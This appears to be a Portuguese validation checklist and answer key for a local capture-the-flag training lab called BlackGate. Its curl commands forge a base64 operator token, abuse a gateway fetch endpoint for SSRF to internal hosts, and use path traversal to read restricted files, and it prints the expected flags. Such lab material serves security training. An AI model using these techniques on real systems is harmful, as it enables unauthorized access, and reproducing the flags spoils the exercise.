# Validação - Lab 05 BlackGate - Fase 5

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- serviço `blackgate` em execução;
- porta `8096:3000`.

## Health e recon público

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/robots.txt
curl -i http://localhost:8096/.well-known/security.txt
curl -i http://localhost:8096/api/status
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i http://localhost:8096/debug/ping
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- endpoints antigos continuam respondendo;
- `/health` retorna `1.4.0-phase5`;
- `/api/version` retorna build `bg-phase5-files-vault`;
- debug com header retorna diagnostics de contexto, gateway e files-vault limitados;
- nenhuma flag aparece em rota pública.

## Login e token operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest" \
  -d "password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fase 3 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Resultado esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Fase 4 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/metadata"
```

Resultado esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

## Files Vault metadata

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/metadata"
```

Resultado esperado:

- `service: files-vault`;
- `catalog`;
- `read_endpoint`;
- `download_endpoint`;
- `safe_paths`;
- `path_policy`.

## Files Vault catalog

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/catalog"
```

Resultado esperado:

- documentos públicos;
- `restricted_index.enabled` como `false`;
- sem flag.

## Arquivo público

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/notices/migration-note.txt"
```

Resultado esperado:

- HTTP 200;
- conteúdo da nota de migração.

## Flag da Fase 5

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"
```

Resultado esperado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Bloqueio de path direto

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/restricted/phase5-seed.txt"
```

Resultado esperado:

- HTTP 403;
- `forbidden_path`.

## Bloqueio de credencial reservada

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt"
```

Resultado esperado:

- HTTP 403;
- `redacted`;
- nenhuma credencial real.

## Rotas autenticadas no navegador

Após login, validar:

```text
/dashboard
/context
/gateway
/files-vault
/tickets
/assets
/security-policy
/logout
```

## Docker

Conferir:

```bash
grep -n "8096:3000" docker-compose.yml
grep -n "ports:" docker-compose.yml
```

Resultado esperado:

- porta pública `8096:3000`;
- somente o serviço web exposto.
